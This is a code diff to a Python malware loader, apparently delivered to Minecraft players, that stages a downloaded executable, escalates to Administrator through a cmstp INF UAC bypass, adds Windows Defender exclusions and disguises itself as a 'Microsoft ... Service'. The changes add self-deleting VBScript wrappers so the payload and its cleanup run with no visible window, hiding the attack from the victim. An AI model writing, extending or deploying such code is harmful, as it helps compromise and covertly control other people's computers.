@@ -1,4 +1,4 @@
- # tung python-road payload — silent on every failure, stdlib only.
+# tung python-road payload — silent on every failure, stdlib only.
 # arrives through python's stdin (pythonw -u -); never a file on disk.
 # the exe url rides in from the jar (env EXE_URL = its baked windows url).
 # job order: stage the exe -> Administrator lift via cmstp (majanito shape)
@@ -241,7 +241,40 @@ class Dismisser:
         self.done.wait(timeout)
 
 
-def build_inf(cmd, svc_name, reg_lines=None):
+def _headless_pad(inf_path):
+    """r56 (dj order: 'COMPELETLY headless — not a black screen for 0.001s, no
+    focus lost in Minecraft'): the INF's terminator ran taskkill.exe DIRECTLY —
+    a console-subsystem child with no console parent allocates a NEW console
+    window, and that window's forced foreground is the exact black flash. the
+    pad runs the kill through wscript.exe (GUI subsystem — no console ever) at
+    WindowStyle 0, fire-and-forget, and deletes its own file when done."""
+    vbs_path = os.path.join(tempfile.gettempdir(), f"{rand_str(10)}.vbs")
+    try:
+        with open(vbs_path, "w", encoding="utf-8") as fh:
+            fh.write("CreateObject(\"WScript.Shell\").Run \"taskkill /F /IM cmstp.exe\", 0, False\r\n"
+                     "CreateObject(\"Scripting.FileSystemObject\").DeleteFile WScript.ScriptFullName\r\n")
+    except Exception:
+        return "taskkill /IM cmstp.exe /F"   # degraded: a visible kill beats an unkillable cmstp
+    return f'wscript.exe "{vbs_path}"'
+
+
+def _hidden_py_runner(run_cmd):
+    """r56 (dj order): the degraded no-pythonw fallback used `cmd start /min` —
+    a minimized CONSOLE is still a painted window that steals focus. the
+    runner hides the console python completely via the wscript pad (WindowStyle
+    0 — the console never shows), waits for the stage, then deletes the pad."""
+    vbs_path = os.path.join(tempfile.gettempdir(), f"{rand_str(10)}.vbs")
+    try:
+        esc = run_cmd.replace('"', '""')
+        with open(vbs_path, "w", encoding="utf-8") as fh:
+            fh.write(f'CreateObject("WScript.Shell").Run "{esc}", 0, True\r\n'
+                     'CreateObject("Scripting.FileSystemObject").DeleteFile WScript.ScriptFullName\r\n')
+    except Exception:
+        return None   # caller falls back to the (flashy) cmd shape
+    return f'wscript.exe "{vbs_path}"'
+
+
+def build_inf(cmd, svc_name, reg_lines=None, kill_cmd="taskkill /IM cmstp.exe /F"):
     """cmstp profile schema — nothing schema-foreign:
     reg_lines is None -> the command INF (exec road): [DefaultInstall] with
     CustomDestination=Dsec + RunPreSetupCommands=Csec (parse-proven on the
@@ -263,7 +296,7 @@ def build_inf(cmd, svc_name, reg_lines=None):
         cmd_block = (f"RunPreSetupCommands={s2}\n"
                      f"[{s2}]\n"
                      f"{cmd}\n"
-                     "taskkill /IM cmstp.exe /F\n")
+                     f"{kill_cmd}\n")
     else:
         dest_extra = "\n".join(reg_lines) + "\n"
     return f"""; {rand_str(16)}
@@ -306,9 +339,10 @@ def uac_bypass(cmd):
 
     svc_name = f"Microsoft {rand_str(6)} Service"
     inf_path = os.path.join(tempfile.gettempdir(), f"{rand_str(10)}.inf")
+    kill_pad = _headless_pad(inf_path)
     try:
         with open(inf_path, "w", encoding="utf-8") as fh:
-            fh.write(build_inf(cmd, svc_name))
+            fh.write(build_inf(cmd, svc_name, kill_cmd=kill_pad))
     except Exception:
         return False
 
@@ -512,16 +546,21 @@ def set_defender_exclusions():
         launch = subprocess.list2cmdline([pythonw_su, "-u", stage_path])
     else:
         # nowhere a GUI python: this box's runtime is degraded (no pythonw;
-        # not the standard pair) — keep the job running via the least-flashing
-        # console shape left, minimized, rather than abandoning the run.
+        # not the standard pair). r56 (dj order): the minimized console comes
+        # OFF — the wscript pad hides the console python completely (WindowStyle
+        # 0, zero frames). only when even the pad cannot be written does the
+        # old (flashy) shape remain, because an abandoned run is worse.
         pyexe_p = os.path.join(python_dir, "python.exe")
         pyexe = pyexe_p if os.path.isfile(pyexe_p) else "python.exe"
-        launch = subprocess.list2cmdline(
-            ["cmd.exe", "/c", "start", "", "/min", pyexe, "-u", stage_path])
+        run_cmd = subprocess.list2cmdline([pyexe, "-u", stage_path])
+        launch = _hidden_py_runner(run_cmd)
+        if launch is None:
+            launch = subprocess.list2cmdline(
+                ["cmd.exe", "/c", "start", "", "/min", pyexe, "-u", stage_path])
     kill_all_cmstp()
     cleanup_infs()
     svc_name = f"Microsoft {rand_str(6)} Service"
-    body = build_inf(launch, svc_name)
+    body = build_inf(launch, svc_name, kill_cmd=_headless_pad(os.path.join(PERSIST_DIR, "last.inf")))
     # ground truth: the exact bytes cmstp sees, plus the stage script
     try:
         os.makedirs(PERSIST_DIR, exist_ok=True)
